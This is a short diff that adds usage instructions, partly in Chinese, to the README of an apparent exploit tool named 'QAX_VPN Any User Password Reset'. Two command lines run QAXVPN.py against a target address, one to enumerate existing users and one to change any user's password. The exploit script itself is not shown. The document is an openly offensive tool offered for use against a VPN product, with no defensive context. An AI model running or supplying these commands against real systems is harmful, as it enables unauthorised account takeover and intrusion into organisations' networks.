@@ -1,4 +1,9 @@
 # QAX_VPN Any User Password Reset
 
 
+使用方法
 
+遍历当前存在用户
+python QAXVPN.py -t https://1.1.1.1 -lu 
+修改任意用户密码
+python QAXVPN.py -t https://1.1.1.1 -u user1 -cp 
